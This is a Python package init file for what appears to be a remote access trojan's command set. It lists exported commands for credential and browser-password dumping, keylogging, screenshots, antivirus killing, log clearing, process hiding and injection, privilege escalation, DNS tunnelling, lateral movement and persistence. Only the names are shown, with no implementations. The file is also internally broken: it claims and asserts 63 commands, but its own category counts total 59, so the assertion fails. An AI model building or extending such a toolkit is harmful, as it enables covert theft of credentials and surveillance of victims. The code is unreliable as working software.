#!/usr/bin/env python3
"""
Elite Commands Package
Individual command implementations using advanced techniques
"""

__version__ = "2.0.0"

# All implemented elite commands - COMPLETE SET OF 63 COMMANDS
__all__ = [
    # Tier 1 - Core Commands (6)
    'elite_ls', 'elite_download', 'elite_upload', 'elite_shell', 'elite_ps', 'elite_kill',
    
    # Filesystem Commands (9)
    'elite_cd', 'elite_pwd', 'elite_cat', 'elite_rm', 'elite_mkdir', 'elite_cp', 'elite_mv', 'elite_rmdir', 'elite_touch',
    
    # System Information Commands (13)
    'elite_systeminfo', 'elite_whoami', 'elite_hostname', 'elite_network', 'elite_processes', 
    'elite_privileges', 'elite_username', 'elite_installedsoftware', 'elite_environment', 'elite_drives',
    'elite_location', 'elite_lsmod', 'elite_fileinfo',
    
    # Tier 2 - Credential & Data Commands (5)
    'elite_hashdump', 'elite_chromedump', 'elite_wifikeys', 'elite_screenshot', 'elite_keylogger',
    
    # Advanced Stealth Commands (9)
    'elite_hidefile', 'elite_hideprocess', 'elite_clearlogs', 'elite_firewall', 'elite_escalate',
    'elite_clearev', 'elite_avkill', 'elite_avscan', 'elite_scanreg',
    
    # Advanced Features (5)
    'elite_inject', 'elite_migrate', 'elite_vmscan', 'elite_port_forward', 'elite_persistence',
    
    # Network and Social Engineering (6)
    'elite_hostsfile', 'elite_askpassword', 'elite_crackpassword', 'elite_dns_tunnel', 'elite_lateral', 'elite_ssh',
    
    # System Control and Manipulation (5)
    'elite_freeze', 'elite_popup', 'elite_lockscreen', 'elite_logintext', 'elite_sudo',
    
    # Persistence Mechanisms (1)
    'elite_persist'
]

# Verify we have exactly 63 commands
assert len(__all__) == 63, f"Expected 63 commands, got {len(__all__)}"